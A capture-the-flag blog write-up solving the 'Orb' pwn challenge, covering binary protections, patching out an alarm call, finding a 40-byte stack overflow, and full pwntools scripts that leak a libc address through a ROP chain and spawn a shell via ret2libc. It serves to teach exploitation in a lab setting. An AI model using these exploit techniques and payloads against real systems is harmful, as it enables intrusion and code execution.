---
layout: post
title: HTB-PlayCyberCTF
date: 2024-01-30
categories:
  - Ctf
tags:
  - Linux
  - Pwn
  - "Patching"
  - "Ret2libc"
keywords:
  - ""
  - ""
description: ""
showFullContent: false
images:
  - /img/test.png
---




This blog post is a walk-through of the Orb Pwn Challenge from the Global Cyber Games: New Year Mayhem 2024 CTF . This pwn challenge was a medium level challenge and an interesting  challenge to solve.

<!--more-->
{{< image src="#" alt=" " position="center" style="border-radius: 8px;" >}}

![ㅤ](../../../images/PlayCyber/20240130111129.png)

### Binary Information
`Binary Type`
* Checking the file type of the binary, we can confirm that the file is a `64bit` executable which is dynamically linked.
```c
./orb: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=4b28eac3bb782d1a94fb6459517bcafc1de84335, for GNU/Linux 3.2.0, not stripped
```

![ㅤ](../../../images/PlayCyber/20240130132011.png)

* Checking the binary protections, we can see that:
	* `Full RELRO` is enabled , meaning we can't overwrite got entries
	* `No Canary Found` meaning that we don't have to leak canaries
	* `NX enabled` meaning that we can't execute shellcode placed on the stack
	* `No Pie` meaning that the binary has static address and we don't have to leak binary addresses during runtime
	* `Runpath` is set to `./glibc/` which indicates that the libc file is provided and the binary uses it instead of the libc on our attacker machine. This can be confirmed using `ldd`
	```json
	# ldd ./orb
	linux-vdso.so.1 (0x00007ffff7fc1000)
	libc.so.6 => ./glibc/libc.so.6 (0x00007ffff7a00000)
	./glibc/ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fc3000)
	```


### Custom Functions
* I then proceeded to check if the binary has any custom functions related to this challenge. I only found two functions which are the `main` and `setup` functions
* The setup function has the following code:
```c
void setup(void)

{
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  alarm(127);
  return;
}
```

* The `setvbuf` function is used to control the buffering of a stream. It is typically used to set the buffering mode for input or output streams.
* The `alarm` function is to set an alarm signal to be delivered to the calling process after a specified time. In this case , the program will exit after the specified number of seconds which can be a pain during debugging. We can remove the function as follows. 

### Patching (Optional)
* We first need to find where the `alarm` function is called in the setup function, and note the opcodes
![ㅤ](../../../images/PlayCyber/20240130114505.png)

* From the image above, we see that the opcodes are `e8 a4 fe ff ff`. Basically what we want to do, is replace the opcodes for `alarm` with `nops` so that instead of the alarm function being called, the program does nothing when it reaches at that point. 
* First we need to convert the binary into hex with `xxd -p ./orb | tr -d '\n'` then grep for `e8a4feffff` to verify that the opcodes are present in the binary.
![ㅤ](../../../images/PlayCyber/20240130115031.png)

* Now we can replace them with nops using `sed` as follows `xxd -p ./orb | tr -d '\n' | sed s/e8a4feffff/9090909090/g | xxd -r -p > ./orb_patched`. After that , we can confirm that the binary permissions are the same and the `alarm` function is no longer present
![ㅤ](../../../images/PlayCyber/20240130115310.png)

![ㅤ](../../../images/PlayCyber/20240130115409.png)

* Now we can debug  easily 😉 . This technique also works for other functions like `PTRACE` . You can also use tools such as `ghidra` to achieve the same


### Ghidra
* Opening up the binary in ghidra , we  find the following code
![ㅤ](../../../images/PlayCyber/20240130120002.png)

* The cleaned up version of the code is as follows
```c
int main(void)

{
  undefined8 buffer;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  setup();
  buffer = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  write(1,&DAT_00402008,0xeb);
  read(0,&buffer,256);
  write(1,"\nThis spell does not seem to work..\n\n",0x26);
  return 0;
}

```

* Running the binary, we note that the binary accepts our input and then prints `This spell does not seem to work`
![ㅤ](../../../images/PlayCyber/20240130120313.png)

* We can now open the binary in `gdb` for debugging. Since the application accepts user input, we craft an input of `300 bytes` and give it to the program 
![ㅤ](../../../images/PlayCyber/20240130120717.png)
* After a while, the program segfaults indicating a probable buffer overflow. We can then calculate the offset to determine after how many bytes the buffer overflow occurs
![ㅤ](../../../images/PlayCyber/20240130120619.png)
* Now that we know that the offset is `40`, we can test if we can overwrite the return address and  redirect the program's execution to other functions e.g main
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#  @author: Remac
from pwn import *
from sys import argv as arguments
filename="./orb_patched"
context.binary = elf = e=ELF(filename)
target=process([filename])

offset=40
payload=b"A"*offset
payload+=p64(elf.sym['main'])


x=(target.recvuntil("Cast spell: "))
print(x.decode())
target.sendline(payload)
target.interactive()

```

![ㅤ](../../../images/PlayCyber/20240130121601.png)

* From the above image, we successfully managed to redirect the program's execution back to main. We can try to build a rop chain to redirect the program's execution to other locations e.g libc functions. But before that, we need to find a way to leak the libc base.
* Checking some of the functions in the binary, we find that the write function is present , which we can use to leak memory address in the `bss` section of the binary
![ㅤ](../../../images/PlayCyber/20240130121814.png)

* Since the binary utilizes static addresses, we can check the address of the bss section as follows 
![ㅤ](../../../images/PlayCyber/20240130123415.png)


### Leaking Libc Addresses
* The write syscall , takes the following arguments `ssize_t write(int fildes, const void *buf, size_t nbyte);`
	* `fildes` is the file descriptor which can be `stdin(0)`, `stdout(1)` and `stderr(2)`. We will store this value in the `rdi` register
	* `*buf` is the buffer to write . We will store this value in the `rsi` register i.e the bss address we obtained
	* `nbyte` is the number of bytes to write. We will store this value in the `rdx` register
* To write a rop chain that calls the `write` syscall with the above parameters, we can search for suitable gadgets in the binary to use in our ropchain
![ㅤ](../../../images/PlayCyber/20240130121921.png)

* From the gadgets in the binary, we do not have the `pop rdx` gadget, we can ignore it and use the value of rdx that will be stored before execution is redirected to our ropchain. Other than that our ropchain will appear as follows
```python
# Gadgets we need 
pop_rbp_ret=0x401139#: pop rbp; ret; 
pop_rdi_ret=0x40127b#: pop rdi; ret; 
pop_rsi_r15=0x401279#: pop rsi; pop r15; ret; 
ret=0x401016#: ret;

bss=0x404010 # start of the .bss section

offset=40
payload=b"A"*offset 
payload+=p64(ret) 
payload+=p64(pop_rdi_ret) # Call the pop_rdi gadget to set the first param of the write syscall
payload+=p64(0x1) # set the first param to stdout i.e 1
payload+=p64(pop_rsi_r15) # Call the pop_rsi;pop_r15;ret gadget to set the second param of the write syscall
payload+=p64(bss) # set the second param to addr of bss i.e 0x404010
payload+=p64(0xdeadbeef) # set a random value to r15 since we don't need it
payload+=p64(elf.plt['write']) # call the write syscall in plt
```

* After sending the payload , we get a libc address leaked which we can later use to calculate the libc base address and call a `one_gadget` or `system`

![ㅤ](../../../images/PlayCyber/20240130125318.png)

* Checking the libc address leaked, we see that it points to  `_IO_2_1_stdout_` which is a function in libc
![ㅤ](../../../images/PlayCyber/20240130125218.png)

### Ret2Libc
* Now we can calculate the libc base and call system as follows
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#  @author: Remac
from pwn import *
context.binary = elf = e = ELF("./orb_patched")
context.log_level='critical'
target=process([filename])
libc_file="./glibc/libc.so.6"
libc=ELF(libc_file)

# Gadgets
pop_rbp_ret=0x401139#: pop rbp; ret; 
pop_rdi_ret=0x40127b#: pop rdi; ret; 
pop_rsi_r15=0x401279#: pop rsi; pop r15; ret; 
ret=0x401016#: ret;
bss=0x404010 # .bss section

# Step 1: Leaking libc address
print(f"\n\n[*] .bss @ {hex(bss)}")
offset=40
payload=b"A"*offset
payload+=p64(ret)
payload+=p64(pop_rdi_ret)
payload+=p64(0x1)
payload+=p64(pop_rsi_r15)
payload+=p64(bss)
payload+=p64(0xdeadbeef)
payload+=p64(elf.plt['write']) 
payload+=p64(elf.sym['main']) # write then go back to main


target.recvuntil("Cast spell: ")
target.sendline(payload)
x=target.recvuntil("Something").split(b'\n\n\x00')[1]
libc_leak=(u64(x[:8]))
print(f"[*] Libc_Leak of _IO_2_1_stdout_ : {hex(libc_leak)}")

# Step 2: Find libc base
libc.address=libc_leak-libc.sym['_IO_2_1_stdout_']
print(f"[*] Libc_base: {hex(libc.address)}")
shell_addr=next(libc.search(b'/bin/sh\x00'))
print("[*] Found shell at : {}".format(str(hex(shell_addr))))
print("[*] Found system at : {}".format(str(hex(libc.sym['system']))))

# Step 3: Ret2Libc
offset=40
payload=b"A"*offset
payload+=p64(ret)
payload+=p64(pop_rdi_ret)
payload+=p64(shell_addr)
payload+=p64(libc.sym['system'])

target.recvuntil("Cast spell: ")
target.sendline(payload)
target.recvuntil(b"\x00")
target.interactive()
```


![ㅤ](../../../images/PlayCyber/20240130131337.png)

### Going Remote
![ㅤ](../../../images/PlayCyber/screenshot-20240127-175634Z-selected.png)

